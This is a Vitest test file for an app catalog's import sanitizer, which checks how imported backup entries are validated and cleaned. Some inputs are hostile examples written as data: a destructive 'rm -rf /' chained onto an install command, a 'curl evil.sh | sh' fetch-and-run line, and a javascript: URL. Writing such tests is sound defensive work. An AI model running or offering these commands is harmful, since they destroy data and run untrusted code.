// Fress - a catalog of free and open-source software.
// Copyright (c) 2026 WasewaseX and Fress contributors
// SPDX-License-Identifier: MIT
//
import { describe, expect, it } from 'vitest';

import { sanitizeAppItem } from '../appValidation';

describe('sanitizeAppItem, trust-boundary validation for imported apps', () => {
  it('rejects non-objects and entries without a usable name', () => {
    expect(sanitizeAppItem(null).app).toBeNull();
    expect(sanitizeAppItem('nope').app).toBeNull();
    expect(sanitizeAppItem([]).app).toBeNull();
    expect(sanitizeAppItem({}).app).toBeNull();
    expect(sanitizeAppItem({ name: '   ' }).app).toBeNull();
    expect(sanitizeAppItem({ name: 42 }).app).toBeNull();
  });

  it('a malformed backup entry can no longer poison the app object', () => {
    // This exact shape used to crash rendering/filtering paths: the old
    // import spread it verbatim into AppItem state.
    const { app } = sanitizeAppItem({
      name: 'Test',
      platforms: null,
      tags: 'not-an-array',
      stars: 'lots',
      category: 'Bogus',
      isOwnerPick: 'yes',
      addedAt: 'not-a-date',
    });
    expect(app).not.toBeNull();
    expect(app?.platforms).toEqual([]);
    expect(app?.tags).toEqual([]);
    expect(app?.stars).toBe(0);
    expect(app?.category).toBe('Utilities & System');
    expect(app?.isOwnerPick).toBe(false);
    expect(/^\d{4}-\d{2}-\d{2}$/.test(app?.addedAt || '')).toBe(true);
  });

  it('keeps only valid platform/category/rating values from mixed arrays', () => {
    const { app } = sanitizeAppItem({
      name: 'Test',
      id: 'test-app',
      platforms: ['windows', 'banana', 'linux', 7, null],
      category: 'Privacy & Security',
      beginnerRating: 'Quick Learning Curve',
      architectures: ['x86_64', 'riscv'],
    });
    expect(app?.platforms).toEqual(['windows', 'linux']);
    expect(app?.category).toBe('Privacy & Security');
    expect(app?.beginnerRating).toBe('Quick Learning Curve');
    expect(app?.architectures).toEqual(['x86_64']);
  });

  it('caps text fields and strips non-http(s) URLs', () => {
    const { app } = sanitizeAppItem({
      name: 'Test',
      githubUrl: 'javascript:alert(1)',
      websiteUrl: 'https://example.com',
      downloadUrl: 'data:text/html,hi',
      description: 'x'.repeat(9000),
    });
    expect(app?.githubUrl).toBe('');
    expect(app?.websiteUrl).toBe('https://example.com');
    expect(app?.downloadUrl).toBeUndefined();
    expect((app?.description || '').length).toBe(4000);
  });

  it('generates an id when the entry arrives without one', () => {
    const { app } = sanitizeAppItem({ name: 'No Id Here' });
    expect(app?.id).toMatch(/^custom-/);
    const again = sanitizeAppItem({ name: 'No Id Here' });
    expect(again.app?.id).not.toBe(app?.id);
  });

  it('keeps plain install commands and counts stripped unsafe ones', () => {
    const ok = sanitizeAppItem({
      name: 'Test',
      wingetCommand: 'winget install Git.Git',
      brewCommand: 'brew install --cask firefox',
    });
    expect(ok.app?.wingetCommand).toBe('winget install Git.Git');
    expect(ok.app?.brewCommand).toBe('brew install --cask firefox');
    expect(ok.strippedCommands).toBe(0);

    const bad = sanitizeAppItem({
      name: 'Test',
      wingetCommand: 'winget install git && rm -rf /',
      brewCommand: 'curl evil.sh | sh',
      aptCommand: 'sudo apt install git',
    });
    expect(bad.app?.wingetCommand).toBeUndefined();
    expect(bad.app?.brewCommand).toBeUndefined();
    expect(bad.strippedCommands).toBeGreaterThanOrEqual(2);
  });

  it('drops invalid or oversized assetPatterns regexes instead of storing them', () => {
    const { app } = sanitizeAppItem({
      name: 'Test',
      assetPatterns: {
        windows: '^myapp-.*?-win64\\.zip$', // valid, kept
        linux: '(', // invalid regex, dropped
        toaster: '.*', // not a platform, dropped
        mac: 'x'.repeat(500), // oversized, dropped
      },
    });
    expect(app?.assetPatterns).toEqual({ windows: '^myapp-.*?-win64\\.zip$' });
  });

  it('whitelists fields: unknown junk in the backup does not survive', () => {
    const { app } = sanitizeAppItem({
      name: 'Test',
      __proto_sneak: { evil: true },
      totallyUnknownField: 12345,
    });
    expect(app && 'totallyUnknownField' in app).toBe(false);
    expect(app && '__proto_sneak' in app).toBe(false);
  });
});
